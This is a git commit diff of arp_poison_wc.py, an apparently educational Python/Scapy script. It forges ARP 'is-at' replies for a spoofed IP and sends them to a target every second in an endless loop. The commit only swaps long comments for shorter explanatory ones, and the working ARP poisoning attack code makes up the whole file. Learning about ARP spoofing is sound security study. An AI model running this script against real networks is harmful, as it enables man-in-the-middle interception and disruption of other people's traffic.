aab9f48acda00b74605b8f6b253807b3c1148efb
Faan Ross <moi@faanross.com>
2023-03-10 11:51:01 -0500

    arp spoofing+

--- arp_poison_wc.py
+++ arp_poison_wc.py
@@ -4,12 +4,7 @@ import sys
 import time
 from scapy.all import sendp , ARP , Ether
 
-# `import sys` imports the sys module, which provides access to some variables 
-#  used or maintained by the interpreter and to functions that interact strongly 
-#  with the interpreter.
-# `import time` imports the time module, which provides various time-related functions.
-# `from scapy.all import sendp, ARP, Ether` imports the `sendp`, `ARP`, and `Ether` 
-# classes from the Scapy library.
+# Here we import the required libraries
 
 target_ip = sys. argv[1]
 fake_ip = sys.argv[2]
@@ -18,11 +13,18 @@ iface = sys.argv[3]
 # Here we set the target ip, spoofed ip, and network interface according to our CL input
 
 ethernet = Ether()
+# This creates an Ethernet header object
+
 arp = ARP(pdst=target_ip ,
         psrc=fake_ip ,
         op="is -at")
+# This creates an ARP header object with the target IP address set to target_ip, the source IP address set to fake_ip, and the operation set to "is-at".
+
 packet = ethernet / arp
+# Here we create an actual packet by combining the Ethernet and ARP header objects
 
 while True:
     sendp(packet , iface=iface)
     time.sleep(1)
+
+# here we create a loop which will send the packet every second until we press ctrl + c
